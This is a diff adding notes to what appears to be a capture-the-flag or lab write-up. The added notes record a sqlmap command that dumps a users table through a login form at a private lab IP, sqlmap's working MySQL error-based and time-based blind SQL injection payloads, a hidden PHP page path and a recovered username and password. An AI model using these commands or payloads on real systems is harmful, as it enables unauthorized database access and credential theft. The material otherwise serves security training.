@@ -46,4 +46,22 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2020/12/10 16:21:50 Finished
 ===================================
 
+sqlmap -u http://10.10.65.99/administrator.php --form -D users -T users --dump  
+
+<pre>---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=&apos;||(SELECT &apos;DiqY&apos; FROM DUAL WHERE 3080=3080 AND (SELECT 8294 FROM(SELECT COUNT(*),CONCAT(0x7162707671,(SELECT (ELT(8294=8294,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||&apos;&amp;password=
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind
+    Payload: username=&apos;||(SELECT &apos;whWq&apos; FROM DUAL WHERE 7394=7394 AND SLEEP(5))||&apos;&amp;password=
+---
+</pre>
+
+
+http://10.10.65.99/2591c98b70119fe624898b1e424b5e91.php
+pingudad:secretpass
+
 ```
